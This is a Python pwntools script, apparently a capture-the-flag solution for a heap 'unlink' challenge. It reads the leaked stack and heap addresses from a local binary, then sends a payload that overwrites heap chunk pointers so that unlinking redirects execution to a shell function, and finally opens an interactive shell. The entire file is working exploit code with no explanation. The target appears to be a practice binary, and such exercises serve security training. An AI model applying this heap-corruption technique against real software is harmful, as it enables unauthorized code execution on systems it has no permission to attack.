# -*- coding: utf-8 -*-
from pwn import *

shell = p32(int("0x80484eb", 16))
proc = process("/home/unlink/unlink")
stack = str(proc.recvline())
heap = str(proc.recvline())
print(stack, heap)
print(proc.recvline())
stack = stack[stack.find("0x"):-1]
ebp = int(stack, 16) + int("0x10", 16)
heap = heap[heap.find("0x"):-1]
heap = int(heap, 16) + int("0xc", 16)

payload = shell
payload += "\x90" * 12
payload += p32(int(hex(heap), 16))
payload += p32(int(hex(ebp), 16))
proc.sendline(payload)
proc.interactive()
